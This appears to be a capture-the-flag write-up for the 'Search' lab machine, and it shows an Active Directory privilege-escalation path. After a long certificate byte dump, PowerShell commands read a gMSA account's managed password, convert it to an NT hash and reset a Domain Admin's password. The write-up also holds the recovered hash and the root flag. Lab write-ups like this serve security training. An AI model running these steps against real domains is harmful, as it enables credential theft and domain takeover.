                                       105 111 110 65 117 116 104 111 114 105 116 121 48 49 6 3 85 29 17 4 42 48 40 

                                       160 38 6 10 43 6 1 4 1 130 55 20 2 3 160 24 12 22 83 105 101 114 114 97 46 70 

                                       114 121 101 64 115 101 97 114 99 104 46 104 116 98 48 13 6 9 42 134 72 134 247 

                                       13 1 1 11 5 0 3 130 1 1 0 72 8 101 13 78 190 237 202 9 233 123 124 27 11 34 40 

                                       104 94 236 94 118 172 158 192 77 22 165 17 126 204 86 148 121 170 130 245 145 

                                       47 144 225 188 76 196 238 159 98 21 81 0 215 128 161 5 144 248 47 37 197 20 244 

                                       87 17 229 189 161 37 198 21 255 120 94 146 63 150 137 43 219 236 101 153 9 221 

                                       32 248 25 192 86 160 66 39 5 104 158 169 114 187 168 243 209 34 57 55 166 189 

                                       208 213 191 204 97 155 66 240 107 157 87 190 146 34 29 10 54 130 91 223 51 133 

                                       63 142 168 101 240 82 76 40 25 157 173 0 245 231 68 172 201 221 142 125 78 254 

                                       123 193 161 6 83 26 3 160 235 168 86 178 74 111 64 122 59 128 118 155 181 155 

                                       32 118 149 133 219 238 209 158 77 189 232 254 112 72 170 238 229 200 252 127 

                                       150 59 156 254 112 21 92 121 134 186 120 21 105 144 171 114 184 237 173 246 151 

                                       185 233 60 117 135 190 148 52 165 9 138 152 112 55 36 123 194 3 165 161 152 230 

                                       73 44 224 188 212 171 4 108 237 133 37 64 211 98 135 173 164 191 9 114 96 129 

                                       9, 48 130 6 38 48 130 5 14 160 3 2 1 2 2 19 84 0 0 0 15 13 114 69 94 28 174 211 

                                       241 0 0 0 0 0 15 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 74 49 19 48 17 6 

                                       10 9 146 38 137 147 242 44 100 1 25 22 3 104 116 98 49 22 48 20 6 10 9 146 38 

                                       137 147 242 44 100 1 25 22 6 115 101 97 114 99 104 49 27 48 25 6 3 85 4 3 19 18 

                                       115 101 97 114 99 104 45 82 69 83 69 65 82 67 72 45 67 65 48 30 23 13 50 48 48 

                                       56 49 48 50 48 49 55 50 50 90 23 13 50 50 48 56 49 48 50 48 50 55 50 50 90 48 

                                       120 49 19 48 17 6 10 9 146 38 137 147 242 44 100 1 25 22 3 104 116 98 49 22 48 

                                       20 6 10 9 146 38 137 147 242 44 100 1 25 22 6 115 101 97 114 99 104 49 14 48 12 

                                       6 3 85 4 11 19 5 83 105 116 101 115 49 19 48 17 6 3 85 4 11 19 10 66 105 114 

                                       109 105 110 103 104 97 109 49 14 48 12 6 3 85 4 11 19 5 85 115 101 114 115 49 

                                       20 48 18 6 3 85 4 3 19 11 83 105 101 114 114 97 32 70 114 121 101 48 130 1 34 

                                       48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3 130 1 15 0 48 130 1 10 2 130 1 1 0 

                                       175 217 84 200 173 2 95 92 166 96 205 161 136 155 37 91 81 94 1 163 5 45 160 

                                       252 243 139 172 200 44 57 94 175 154 7 58 202 155 118 14 159 92 136 9 248 245 

                                       133 139 138 191 158 33 195 124 154 227 195 133 149 231 110 146 216 112 198 110 

                                       156 220 236 241 9 56 39 82 193 204 84 145 177 34 88 7 97 213 153 122 31 32 164 

                                       189 193 216 51 120 7 129 188 76 232 225 165 104 228 248 20 201 147 103 104 112 

                                       56 8 1 41 130 78 161 171 48 61 227 8 31 151 121 89 227 126 76 91 46 78 212 254 

                                       135 200 32 52 45 132 213 131 98 180 220 19 102 82 27 71 112 105 97 244 116 148 

                                       240 225 193 172 148 198 72 47 58 246 39 131 200 116 180 85 254 114 124 109 170 

                                       8 146 52 45 58 64 139 105 45 23 87 188 160 41 152 10 73 113 248 251 152 46 145 

                                       140 209 182 160 120 0 28 154 183 100 153 97 107 3 226 170 229 160 254 167 81 

                                       255 1 176 124 78 24 246 232 11 218 122 71 165 186 139 24 120 14 234 230 242 47 

                                       81 244 171 195 200 49 62 49 239 58 45 30 195 221 2 3 1 0 1 163 130 2 213 48 130 

                                       2 209 48 59 6 9 43 6 1 4 1 130 55 21 7 4 46 48 44 6 36 43 6 1 4 1 130 55 21 8 

                                       138 171 73 132 252 188 117 165 159 27 135 131 204 92 133 146 204 49 129 105 188 

                                       243 84 134 140 254 40 2 1 100 2 1 14 48 19 6 3 85 29 37 4 12 48 10 6 8 43 6 1 5 

                                       5 7 3 2 48 14 6 3 85 29 15 1 1 255 4 4 3 2 5 160 48 27 6 9 43 6 1 4 1 130 55 21 

                                       10 4 14 48 12 48 10 6 8 43 6 1 5 5 7 3 2 48 68 6 9 42 134 72 134 247 13 1 9 15 

                                       4 55 48 53 48 14 6 8 42 134 72 134 247 13 3 2 2 2 0 128 48 14 6 8 42 134 72 134 

                                       247 13 3 4 2 2 0 128 48 7 6 5 43 14 3 2 7 48 10 6 8 42 134 72 134 247 13 3 7 48 

                                       29 6 3 85 29 14 4 22 4 20 81 199 212 211 115 43 57 48 223 207 165 224 89 199 13 

                                       7 173 176 56 110 48 31 6 3 85 29 35 4 24 48 22 128 20 106 145 173 123 40 111 

                                       181 72 166 91 56 206 188 98 170 95 231 87 236 80 48 129 208 6 3 85 29 31 4 129 

                                       200 48 129 197 48 129 194 160 129 191 160 129 188 134 129 185 108 100 97 112 58 

                                       47 47 47 67 78 61 115 101 97 114 99 104 45 82 69 83 69 65 82 67 72 45 67 65 44 

                                       67 78 61 82 101 115 101 97 114 99 104 44 67 78 61 67 68 80 44 67 78 61 80 117 

                                       98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 44 67 

                                       78 61 83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117 114 

                                       97 116 105 111 110 44 68 67 61 115 101 97 114 99 104 44 68 67 61 104 116 98 63 

                                       99 101 114 116 105 102 105 99 97 116 101 82 101 118 111 99 97 116 105 111 110 

                                       76 105 115 116 63 98 97 115 101 63 111 98 106 101 99 116 67 108 97 115 115 61 

                                       99 82 76 68 105 115 116 114 105 98 117 116 105 111 110 80 111 105 110 116 48 

                                       129 195 6 8 43 6 1 5 5 7 1 1 4 129 182 48 129 179 48 129 176 6 8 43 6 1 5 5 7 

                                       48 2 134 129 163 108 100 97 112 58 47 47 47 67 78 61 115 101 97 114 99 104 45 

                                       82 69 83 69 65 82 67 72 45 67 65 44 67 78 61 65 73 65 44 67 78 61 80 117 98 108 

                                       105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 44 67 78 61 

                                       83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117 114 97 116 

                                       105 111 110 44 68 67 61 115 101 97 114 99 104 44 68 67 61 104 116 98 63 99 65 

                                       67 101 114 116 105 102 105 99 97 116 101 63 98 97 115 101 63 111 98 106 101 99 

                                       116 67 108 97 115 115 61 99 101 114 116 105 102 105 99 97 116 105 111 110 65 

                                       117 116 104 111 114 105 116 121 48 49 6 3 85 29 17 4 42 48 40 160 38 6 10 43 6 

                                       1 4 1 130 55 20 2 3 160 24 12 22 83 105 101 114 114 97 46 70 114 121 101 64 115 

                                       101 97 114 99 104 46 104 116 98 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 3 130 

                                       1 1 0 164 90 65 209 37 4 11 12 77 188 234 127 250 222 84 132 254 53 233 250 172 

                                       78 154 188 214 237 70 204 36 116 193 23 94 50 246 80 99 141 114 176 80 156 208 

                                       8 179 60 205 108 180 9 19 18 59 243 192 106 22 186 11 93 67 73 216 133 175 112 

                                       100 133 33 217 76 73 81 189 227 100 229 55 34 82 111 183 18 191 170 171 125 148 

                                       60 241 74 86 45 38 14 92 191 139 90 248 37 59 234 216 209 179 189 235 237 240 

                                       42 174 167 206 217 247 126 23 1 152 143 243 35 98 160 48 59 20 192 197 102 228 

                                       54 60 111 125 160 11 125 187 127 88 103 232 149 216 106 73 87 4 64 69 168 181 

                                       65 212 166 159 125 202 136 240 92 76 184 222 68 111 186 11 73 112 74 174 239 

                                       218 175 234 122 42 67 60 177 158 163 219 127 144 124 65 156 138 94 140 38 180 

                                       31 171 179 31 188 63 185 179 239 160 190 13 69 71 22 94 194 157 211 1 205 217 

                                       27 38 70 36 210 170 54 123 157 195 31 144 163 195 21 192 163 182 242 112 209 

                                       126 237 184 97 37 143 0 188 27 123 152 177 104 207 249 14 183...}

UserPrincipalName                    : Sierra.Frye@search.htb

uSNChanged                           : 213379

uSNCreated                           : 14849

whenChanged                          : 12/28/2021 1:26:44 PM

whenCreated                          : 4/6/2020 3:37:16 PM
```

- sierra.frye is member of BIRMINGHAM-ITSEC group which is member of ITSEC group which has ReadMGSAPassword ACL on COVID.search.htb machine account that has GenericAll ACL on Tristan.Davies who is member of Domain Admins

![ad-group-members-itsec.png](Search%20a97d63e6ba4148dfb5fe67b531374466/ad-group-members-itsec.png)

![service-account-enumeration.png](Search%20a97d63e6ba4148dfb5fe67b531374466/service-account-enumeration.png)

![object-class.png](Search%20a97d63e6ba4148dfb5fe67b531374466/object-class.png)

[Retrieving Cleartext GMSA Passwords from Active Directory](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)

```powershell
#Extracting hash for BIR- account
PS C:\Users\Sierra.Frye\Documents> 
$hash = ConvertTo-NTHash -Password $pt.SecureCurrentPassword
PS C:\Users\Sierra.Frye\Documents> 
echo $hash
e1e9fd9e46d0d747e1595167eedcec0f
```

![verify-nthash.png](Search%20a97d63e6ba4148dfb5fe67b531374466/verify-nthash.png)

- we have to dump gMSA hash for the service account BIR-ADFS-GSMA

```powershell
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$pt = ConvertFrom-ADManagedPasswordBlob $mp
```

[Add Credential support to PowerShell functions - PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2)

```powershell
$username = 'BIR-ADFS-GMSA$'
$cred = New-Object System.Management.Automation.PSCredential $username, $pt.SecureCurrentPassword

# Command to change Tristan.Davies' password
# /domain -> this performs the operation on the selected domain
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user Tristan.Davies mypass123 /domain}
```

- now just login using Tristan.Davies new creds

# Privilege Escalation

## Notes

- root.txt
    - 0cbf78726fce1eeadef099421a7555e3